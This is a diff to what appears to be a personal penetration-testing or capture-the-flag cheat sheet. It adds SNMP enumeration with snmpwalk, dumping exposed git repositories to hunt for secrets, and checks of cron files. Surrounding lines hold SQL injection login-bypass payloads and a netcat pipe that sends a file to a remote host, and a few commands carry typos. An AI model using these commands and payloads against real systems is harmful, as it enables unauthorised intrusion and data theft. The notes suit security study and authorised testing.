@@ -15,6 +15,8 @@ services/version webshell plugin
 Port 21 FTP
 $ ftp anonymous@ipadd
 -> check : status, trace, debug, ls -R
+$ passive (off passive mode)
+$ 
 $ ftp-ssl -z secure -z verify=0 -p ipadd
 $ ftp-ssl -z secure -z verify=0 -z cipher="$(openssl ciphers -tls1)" -p ipadd
 $ info || put file.txt (cek info and put file)
@@ -101,6 +103,13 @@ $ sudo nmap ip -p111,2049 -sV -sV | or add --script nfs*
 $ showmount -e ip
 $ mkdir targetNFS -> sudo mount -t nsf ip:/ ./targetNFS/ -o nolock -> cd targetNFS -> tree .
 
+Port 161 UDP/SNMP
+$ sudo nmap -sU -T4 -sC -Pn <IP>
+$ snmpwalk -v2c -c private -v1 -t 10 <IP>   
+$ snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+* find anomali port, ex: port 3003 exploit in browser
+
 DNS
 $ dig soa domain
 $ dig ns domain @ip
@@ -153,6 +162,7 @@ SQL trigered:
 <username>'--
 ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
 'OR 1=1--
+
 
 mssql:
 $help
@@ -229,5 +239,22 @@ On your server (A):
 nc -l -p 1234 -q 1 > something.zip < /dev/null
 On your "sender client" (B):
 cat something.zip | netcat server.ip.here 1234
+
+*check repo using git dumper: (activate first python venv) https://github.com/arthaud/git-dumper.git
+$ python3 git_dumper.py <URL.git> dumped-repo
+$ cd dumper-repo
+$ git show
+check the sensitive information
+
+*check suspect folder:
+$ /opt
+$ /etc/crontab
+$ /etc/cron.d
+
+
+*Find a file(?):
+$ exiftool -a file
+
+
 
 
